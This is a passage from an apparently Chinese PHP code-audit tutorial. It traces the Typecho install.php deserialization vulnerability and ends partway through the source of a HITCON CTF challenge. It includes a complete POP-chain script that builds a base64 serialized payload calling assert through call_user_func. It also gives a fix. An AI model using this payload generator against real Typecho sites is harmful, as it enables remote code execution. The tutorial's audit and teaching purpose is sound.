class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">              <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                  <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                      <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          ......</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在代码 <strong>19行</strong> ， <strong>$this-&gt;_items</strong> 为类变量，反序列化可控，在代码 <strong>27行</strong> ， <strong>$item[‘author’]-&gt;screenName</strong> ，如果 <strong>$item[‘author’]</strong> 中存储的类没有’screenName’属性或该属性为私有属性，此时会触发该类中的 <strong>__get()</strong> 魔法方法，这个可作为进一步利用的点，继续往下看代码，未发现有危险函数的调用。</p></li></ul><p>记一波魔术方法及对应的触发条件，具体如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//使用unserialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//使用serialize时触发</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><p>在 <strong>var&#x2F;Typecho&#x2F;Request.php</strong> 的  <strong>Typecho_Request</strong> 类中，我们发现 <strong>__get()</strong> 方法，跟踪该方法的调用，具体如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_filter <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$default</span> = <span class="literal">NULL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;_params[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>]):</span><br><span class="line">            <span class="variable">$value</span> = <span class="built_in">self</span>::<span class="variable">$_httpParams</span>[<span class="variable">$key</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$value</span> = !<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">0</span> ? <span class="variable">$value</span> : <span class="variable">$default</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_applyFilter</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>array_map()</strong> 函数和 <strong>call_user_func</strong> 函数，都可以作为利用点，**$filter** 作为调用函数，**$value** 为函数参数，跟踪变量,看一下是否可控。这两个变量都来源于类变量，反序列化可控。从上面的分析中，可知当 <strong>$item[‘author’]</strong> 满足一定条件会触发 <strong>__get</strong> 方法。</p><p>假设 <strong>$item[‘author’]</strong> 中存储 <strong>Typecho_Request</strong> 类实例，此时调用 <strong>$item[‘author’]-&gt;screenName</strong> ，在<strong>Typecho_Request</strong> 类中没有该属性，就会调用类中的 <strong>__get($key)</strong> 方法，**$key** 传入的值为 <strong>scrrenName</strong> 。参数传递过程如下：<code>$key=&#39;scrrenName&#39;</code>&#x3D;&gt;<code>$this-&gt;_param[$key]</code>&#x3D;&gt;<code>$value</code></p><p>我们将 <strong>$this-&gt;_param[‘scrrenName’]</strong> 的值设置为想要执行的函数，构造 <strong>$this-&gt;_filter</strong> 为对应函数的参数值，具体构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来我们去看一下 <strong>Typecho_Feed</strong> 类的构造，该类在 <strong>var&#x2F;Typecho&#x2F;Feed.php</strong> 文件中，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;_charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">            xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">            xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">            xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">            xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">            xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上图代码 <strong>第7行</strong> ，满足 <strong>self::RSS2</strong> 与 <strong>$this-&gt;_type</strong> 相等进入该分支，所以 <strong>$this-&gt;_type</strong> 需要构造，<strong>item[‘author’]</strong> 为触发点，需要构造 <strong>$this_items</strong> ，具体构造如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_type = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>();</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="title function_ invoke__">Array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="variable">$x</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>代码 <strong>22行</strong> 在实际利用没必要添加，install.php在代码 <strong>54行</strong> 调用 <strong>ob_start()</strong> 函数，该函数对输出内容进行缓冲,反序列化漏洞利用结束后，在<strong>var\Typecho\Db.php</strong>代码121行，触发异常，在 <strong>var\Typecho\Common.php</strong> 代码237行调用 <strong>ob_end_clean()函数</strong> 清除了缓冲区内容，导致无法看见执行结果，考虑在进入到异常处理前提前报错结束程序。由此构造该数据。执行结果如下： </p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-20.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>造成该漏洞的原因主要有两点：</p><ul><li>当 <strong>config.inc.php</strong> 文件存在的时，可绕过判断继续往下执行代码。</li><li>传入反序列化函数的参数可控</li></ul><p>修复方法：在 <strong>install.php</strong> 文件第一行判断 <strong>config.inc.php</strong> 是否存在，如果存在，则退出代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/config.inc.php&#x27;</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db_host</span>, <span class="variable">$db_name</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>, <span class="variable">$DEBUG</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;conn)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;conn = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_name</span>, <span class="variable">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$DEBUG</span>) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;DROP TABLE IF  EXISTS  users&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$back</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">        <span class="variable">$obj</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">define</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$obj</span>-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span 